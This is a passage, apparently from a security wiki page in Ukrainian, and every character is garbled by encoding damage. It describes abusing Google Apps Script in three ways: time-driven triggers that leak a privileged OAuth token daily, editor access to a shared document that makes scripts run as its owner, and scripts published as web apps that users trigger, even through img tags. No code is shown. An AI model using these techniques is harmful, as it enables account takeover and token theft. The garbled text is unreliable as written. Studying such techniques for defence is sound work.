–¢–∞–∫–æ–∂ –º–æ–∂–Ω–∞ —Å—Ç–≤–æ—Ä–∏—Ç–∏ —Å–∫—Ä–∏–ø—Ç –¥–æ–¥–∞—Ç–∫–∞ —Ç–∞ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ —Ç—Ä–∏–≥–µ—Ä –Ω–∞ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è —á–µ—Ä–µ–∑ X —á–∞—Å—É (–Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –∫–æ–∂–Ω—É —Ö–≤–∏–ª–∏–Ω—É, –≥–æ–¥–∏–Ω—É, –¥–µ–Ω—å...). –ó–ª–æ–≤–º–∏—Å–Ω–∏–∫, —è–∫–∏–π **–æ—Ç—Ä–∏–º–∞–≤ –¥–æ—Å—Ç—É–ø –¥–æ –æ–±–ª—ñ–∫–æ–≤–∏—Ö –¥–∞–Ω–∏—Ö –∞–±–æ —Å–µ—Å—ñ—ó –∂–µ—Ä—Ç–≤–∏, –º–æ–∂–µ –≤—Å—Ç–∞–Ω–æ–≤–∏—Ç–∏ —Ç—Ä–∏–≥–µ—Ä —á–∞—Å—É –¥–ª—è —Å–∫—Ä–∏–ø—Ç–∞ –¥–æ–¥–∞—Ç–∫–∞ —Ç–∞ –≤–∏—Ç—ñ–∫–∞—Ç–∏ –¥—É–∂–µ –ø—Ä–∏–≤—ñ–ª–µ–π–æ–≤–∞–Ω–∏–π OAuth —Ç–æ–∫–µ–Ω —â–æ–¥–Ω—è**:

–ü—Ä–æ—Å—Ç–æ —Å—Ç–≤–æ—Ä—ñ—Ç—å —Å–∫—Ä–∏–ø—Ç –¥–æ–¥–∞—Ç–∫–∞, –ø–µ—Ä–µ–π–¥—ñ—Ç—å –¥–æ –¢—Ä–∏–≥–µ—Ä—ñ–≤, –Ω–∞—Ç–∏—Å–Ω—ñ—Ç—å –Ω–∞ –î–æ–¥–∞—Ç–∏ —Ç—Ä–∏–≥–µ—Ä —Ç–∞ –≤–∏–±–µ—Ä—ñ—Ç—å —è–∫ –¥–∂–µ—Ä–µ–ª–æ –ø–æ–¥—ñ—ó Time-driven —Ç–∞ –≤–∏–±–µ—Ä—ñ—Ç—å –æ–ø—Ü—ñ—ó, —è–∫—ñ –Ω–∞–π–∫—Ä–∞—â–µ –ø—ñ–¥—Ö–æ–¥—è—Ç—å –≤–∞–º:

<figure><img src="../../../.gitbook/assets/image (147).png" alt=""><figcaption></figcaption></figure>

{% hint style="danger" %}
–¶–µ –ø—Ä–∏–∑–≤–µ–¥–µ –¥–æ –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–Ω—è –µ–ª–µ–∫—Ç—Ä–æ–Ω–Ω–æ—ó –ø–æ—à—Ç–∏ –∑ –ø–æ–ø–µ—Ä–µ–¥–∂–µ–Ω–Ω—è–º –ø—Ä–æ —Ü–µ —Ç–∞ –ø–æ–≤—ñ–¥–æ–º–ª–µ–Ω–Ω—è –Ω–∞ –≤–∞—à –º–æ–±—ñ–ª—å–Ω–∏–π –ø—Ä–∏—Å—Ç—Ä—ñ–π.
{% endhint %}

### –û–±—Ö—ñ–¥ –Ω–µ–ø—ñ–¥—Ç–≤–µ—Ä–¥–∂–µ–Ω–æ–≥–æ –∑–∞–ø–∏—Ç—É –Ω–∞ —Å–ø—ñ–ª—å–Ω–∏–π –¥–æ–∫—É–º–µ–Ω—Ç

–ë—ñ–ª—å—à–µ —Ç–æ–≥–æ, —è–∫—â–æ —Ö—Ç–æ—Å—å **–ø–æ–¥—ñ–ª–∏–≤—Å—è** –∑ –≤–∞–º–∏ –¥–æ–∫—É–º–µ–Ω—Ç–æ–º –∑ **–¥–æ—Å—Ç—É–ø–æ–º —Ä–µ–¥–∞–∫—Ç–æ—Ä–∞**, –≤–∏ –º–æ–∂–µ—Ç–µ —Å—Ç–≤–æ—Ä–∏—Ç–∏ **—Å–∫—Ä–∏–ø—Ç–∏ –¥–æ–¥–∞—Ç–∫—ñ–≤ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –¥–æ–∫—É–º–µ–Ω—Ç–∞**, –∞ **–í–õ–ê–°–ù–ò–ö (—Å—Ç–≤–æ—Ä—é–≤–∞—á) –¥–æ–∫—É–º–µ–Ω—Ç–∞ –±—É–¥–µ –≤–ª–∞—Å–Ω–∏–∫–æ–º —Å–∫—Ä–∏–ø—Ç–∞ –¥–æ–¥–∞—Ç–∫–∞**.

{% hint style="warning" %}
–¶–µ –æ–∑–Ω–∞—á–∞—î, —â–æ **—Å—Ç–≤–æ—Ä—é–≤–∞—á –¥–æ–∫—É–º–µ–Ω—Ç–∞ –±—É–¥–µ –≤–∏–≥–ª—è–¥–∞—Ç–∏ —è–∫ —Å—Ç–≤–æ—Ä—é–≤–∞—á –±—É–¥—å-—è–∫–æ–≥–æ —Å–∫—Ä–∏–ø—Ç–∞ –¥–æ–¥–∞—Ç–∫–∞**, —è–∫–∏–π –±—É–¥—å-—Ö—Ç–æ –∑ –¥–æ—Å—Ç—É–ø–æ–º —Ä–µ–¥–∞–∫—Ç–æ—Ä–∞ —Å—Ç–≤–æ—Ä—é—î –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ –Ω—å–æ–≥–æ.

–¶–µ —Ç–∞–∫–æ–∂ –æ–∑–Ω–∞—á–∞—î, —â–æ **—Å–∫—Ä–∏–ø—Ç –¥–æ–¥–∞—Ç–∫–∞ –±—É–¥–µ –¥–æ–≤—ñ—Ä—è—Ç–∏ —Å–µ—Ä–µ–¥–æ–≤–∏—â—É Workspace** —Å—Ç–≤–æ—Ä—é–≤–∞—á–∞ –¥–æ–∫—É–º–µ–Ω—Ç–∞.
{% endhint %}

{% hint style="danger" %}
–¶–µ —Ç–∞–∫–æ–∂ –æ–∑–Ω–∞—á–∞—î, —â–æ —è–∫—â–æ **—Å–∫—Ä–∏–ø—Ç –¥–æ–¥–∞—Ç–∫–∞ –≤–∂–µ —ñ—Å–Ω—É—î** —ñ –ª—é–¥–∏ –Ω–∞–¥–∞–ª–∏ **–¥–æ—Å—Ç—É–ø**, –±—É–¥—å-—Ö—Ç–æ –∑ –¥–æ–∑–≤–æ–ª–æ–º **–†–µ–¥–∞–∫—Ç–æ—Ä** –Ω–∞ –¥–æ–∫—É–º–µ–Ω—Ç –º–æ–∂–µ **–∑–º—ñ–Ω–∏—Ç–∏ –π –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Ü–∏–º –¥–æ—Å—Ç—É–ø–æ–º**.\
–©–æ–± –∑–ª–æ–≤–∂–∏–≤–∞—Ç–∏ —Ü–∏–º, –≤–∞–º —Ç–∞–∫–æ–∂ –ø–æ—Ç—Ä—ñ–±–Ω–æ, —â–æ–± –ª—é–¥–∏ –≤–∏–∫–ª–∏–∫–∞–ª–∏ —Å–∫—Ä–∏–ø—Ç –¥–æ–¥–∞—Ç–∫–∞. –Ü –æ–¥–∏–Ω —Ü—ñ–∫–∞–≤–∏–π —Ç—Ä—é–∫ - **–æ–ø—É–±–ª—ñ–∫—É–≤–∞—Ç–∏ —Å–∫—Ä–∏–ø—Ç —è–∫ –≤–µ–±-–¥–æ–¥–∞—Ç–æ–∫**. –ö–æ–ª–∏ **–ª—é–¥–∏**, —è–∫—ñ –≤–∂–µ –Ω–∞–¥–∞–ª–∏ **–¥–æ—Å—Ç—É–ø** –¥–æ —Å–∫—Ä–∏–ø—Ç–∞ –¥–æ–¥–∞—Ç–∫–∞, –æ—Ç—Ä–∏–º–∞—é—Ç—å –¥–æ—Å—Ç—É–ø –¥–æ –≤–µ–±-—Å—Ç–æ—Ä—ñ–Ω–∫–∏, –≤–æ–Ω–∏ **–≤–∏–∫–ª–∏—á—É—Ç—å —Å–∫—Ä–∏–ø—Ç –¥–æ–¥–∞—Ç–∫–∞** (—Ü–µ —Ç–∞–∫–æ–∂ –ø—Ä–∞—Ü—é—î –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é —Ç–µ–≥—ñ–≤ `<img>`).
{% endhint %}
